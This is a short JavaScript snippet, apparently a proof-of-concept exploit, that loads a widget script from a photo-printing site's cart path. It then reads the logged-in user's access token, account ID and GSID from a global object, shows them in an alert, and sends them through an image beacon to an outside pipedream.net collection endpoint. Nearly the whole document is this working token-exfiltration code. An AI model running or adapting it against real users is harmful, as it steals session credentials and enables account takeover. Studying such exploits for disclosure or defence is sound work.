(() => {
  const s = document.createElement("script");
  s.src = "https://www.snapfish.com/cart/static/previewwidget.js?context=/hp/sf/sf-us/snapfish-us";
  s.onload = () => {
    const u = window.userInfo || {}, p = "https://eo1ey5201bcmppg.m.pipedream.net";
    alert(`Access Token: ${u.access_token || 'n/a'}\n\nAccount ID: ${u.account_id || 'n/a'}\n\nGSID: ${u.gsid || 'n/a'}`);
    new Image().src = `${p}?t=${encodeURIComponent(u.access_token||'')}&id=${encodeURIComponent(u.account_id||'')}&g=${encodeURIComponent(u.gsid||'')}&cb=${Date.now()}`;
  };
  document.head.appendChild(s);
})();
